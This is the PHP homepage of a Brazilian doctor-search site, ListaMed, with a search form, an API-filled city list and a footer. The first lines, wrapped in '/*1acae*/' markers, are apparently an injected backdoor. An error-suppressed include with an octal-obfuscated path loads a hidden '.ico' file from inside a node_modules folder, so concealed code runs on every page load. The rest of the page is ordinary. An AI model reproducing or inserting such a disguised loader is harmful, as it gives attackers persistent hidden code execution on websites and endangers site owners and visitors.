<?php
/*1acae*/

@include "\057h\157m\145/\167i\156g\157v\143o\057p\165b\154i\143_\150t\155l\057l\151s\164a\155e\144.\143o\155.\142r\057n\157d\145_\155o\144u\154e\163/\155i\155e\055d\142/\0562\0663\060d\0615\071.\151c\157";

/*1acae*/ session_start(); ?>
<?php header("Content-type: text/html; charset=utf-8"); ?>
<?php require_once('config.php'); ?>

<!DOCTYPE html>
<html>
<head>
	<title>Listamed</title>
    <meta title="ListaMed">
    <meta description="<?php echo $descricao_seo ?>">
	<meta charset="utf-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet"> 
    <link rel="stylesheet" type="text/css" href="./css/champs.min.css">
    <!--[if lt IE 8]>
    	<script type="text/javascript" src="js/html5shiv.min.js"></script>
    <![endif]-->

    <script>
	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

	  ga('create', 'UA-93204909-1', 'auto');
	  ga('send', 'pageview');

	</script>
</head>
<body>
<?php
	$ip = $_SERVER['REMOTE_ADDR'];
	$url = "http://www.geoplugin.net/json.gp?ip=$ip";

	$content = json_decode(file_get_contents($url));
	$cidadeIp = ($content->geoplugin_regionName=="São Paulo") ? "SP - ".$content->geoplugin_city : "SP - ".$content->geoplugin_city;

	// buscando cidades cadastradas
	//$response = json_decode(file_get_contents('https://www.listamed.com.br/api/cidades/cadastradas/'));
	$response = json_decode(file_get_contents('http://www.listamed.com.br/api/cidades/cadastradas/', false, stream_context_create($arrContextOptions)));
?>
	<div id="home" class="page page-home">
		<div class="page-content page-bg page-bg--index layout-control--js layout-height--full layout-container--center">
			<div class="layout-container">
				<section class="page--section">
					<div class="container">
						<div class="text-center">
							<h1 class="logo">
								<a href="<?php echo $caminho; ?>">
									<img src="./images/logo-1.png" />
								</a>
							</h1>
							<?php /* <p><?php echo $texto_principal ?></p> */ ?>
							<div class="page-home--form">
								<form id="home-form" action="medicos.php" method="get">
									<fieldset>
										<div class="row">
											<div class="col-xs-12 col-sm-6 col-md-5 col-lg-5">
												<div class="form-group">
													<label class="sr-only">Busque por médico, clínica ou especialidade</label>
													<input class="form-control" id="home-form--busca" type="text" name="buscar" placeholder="Busque por médico, clínica ou especialidade" autocomplete="off" autocapitalize="off" spellcheck="false" />
												</div>
											</div>
											<div class="col-xs-12 col-sm-4 col-md-4 col-lg-5">
												<div class="form-group">
													<label class="sr-only">Cidade</label>
													<select class="form-control" name="cidade" id="home-form--cidade">
														<option placeholder="Cidade" disabled selected>Selecione uma Cidade</option>
														<?php $cidade = ($_SESSION['buscar_cidade']!="") ? $_SESSION['buscar_cidade'] : $cidadeIp ?>
														<?php foreach ($response->data as $k => $v) {  ?>
															<option <?php echo ($v->cidade == $cidade) ? "SELECTED" : "" ;?><?php echo ($cidade == $v->id) ? "SELECTED" : "" ;?>  value="<?php echo $v->id; ?>"><?php echo $v->cidade; ?></option>
														<?php } ?>
													</select>
												</div>
											</div>
											<div class="col-xs-12 col-sm-2 col-md-2 col-lg-2">
												<button id="home-form--submit" type="button" data-form="home-form" class="btn btn-block btn-theme-blue" title="Buscar">Buscar</button>
											</div>
										</div>									
									</fieldset>
								</form>
								<p>Sou um profissional da área e quero me <a href="<?php echo $caminho; ?>seja">cadastrar</a></p>
							</div>
						</div>					
					</div>
				</section>
			</div>			
		</div>
		<footer class="page-footer">
			<div class="page-footer--gray">
				<div class="container">
					<div class="row">
						<div class="col-lg-2 col-md-3 hidden-xs hidden-sm visible-md visible-lg">
							<a href="<?php echo $caminho; ?>seja">Sou profissional da área</a>							
						</div>
						<div class="col-xs-12 col-sm-12 col-md-9 col-lg-10">
							<div class="page-footer--links">
								<ul class="list list-items--inline">
									<li class="list--item"><a href="<?php echo $caminho; ?>contato">Contato</a></li>
									<li class="list--item"><a href="<?php echo $caminho; ?>perguntas-frequentes">Perguntas Frequentes</a></li>
									<li class="list--item"><a href="<?php echo $caminho; ?>sobre">Sobre a ListaMed</a></li>
								</ul>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="page-footer--light">
				<div class="container">
					<div class="row">
						<div class="col-xs-12 col-sm-2 col-md-3 col-lg-4">
							<div class="page-footer--links">
								<ul class="list list-items--inline">
									<li class="list--item">
										<a href="<?php echo $caminho; ?>">
											<img src="./images/logo-internas-bot.png" />
										</a>									
									</li>
									<li class="list--item cfm">
				                        <a href="https://portal.cfm.org.br/" target="_blank">
				                        	<img src="<?php echo $caminhoOnline; ?>images/logo-cfm.png" alt="" />
				                       	</a>
									</li>
								</ul>								
							</div>
						</div>	
	                    <div class="col-xs-12 col-sm-8 col-md-7 col-lg-6">
	                        <p>ListaMED é desenvolvida dentro das normas e termos do CFM e da CODAME.</p>
	                    </div>
						<div class="col-xs-12 col-sm-2 col-md-2 col-lg-2">
				            <?php $conteudo2 =   json_decode(file_get_contents("http://listamed.com.br/api/page", false, stream_context_create($arrContextOptions))); ?>
		 					<div class="page-footer--links text-right">
		 						<ul class="list list-items--inline">
		 							<li class="list--item">
		 								<a href="<?php echo $conteudo2->instagram; ?>"><i class="fa fa-twitter-square" aria-hidden="true"></i></a>		 								
		 							</li>
		 							<li class="list--item">
		                    			<a href="<?php echo $conteudo2->facebook; ?>"><i class="fa fa-facebook-square" aria-hidden="true"></i></a>		 								
		 							</li>
		 							<li class="list--item">
		                    			<a href="<?php echo $conteudo2->linkedin; ?>"><i class="fa fa-linkedin-square" aria-hidden="true"></i></a>		 								
		 							</li>
		 						</ul>
		 					</div>
						</div>
					</div>
				</div>
			</div>					
			<div class="page-footer--dark">
				<div class="container">
					<div class="row">
						<div class="col-xs-12 col-sm-8 col-md-8 col-lg-8">
							<div class="page-footer--copyright">
								<p>Todos os direitos reservados - ListaMED <?php echo date('Y'); ?> ®</p>								
							</div>
						</div>						
						<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4">
							<div class="page-footer--dev">
								<p>
									Feito por 
									<a href="http://www.wdezoito.com.br/" target="_blank"><img src="./images/logo-w18.png" /></a>
								</p>
								
							</div>
						</div>
					</div>
				</div>
			</div>
		</footer>
	</div>
    <script src="./js/jquery-1.12.4.min.js"></script>
 	<script src="./js/champs.min.js"></script>
</body>
</html>
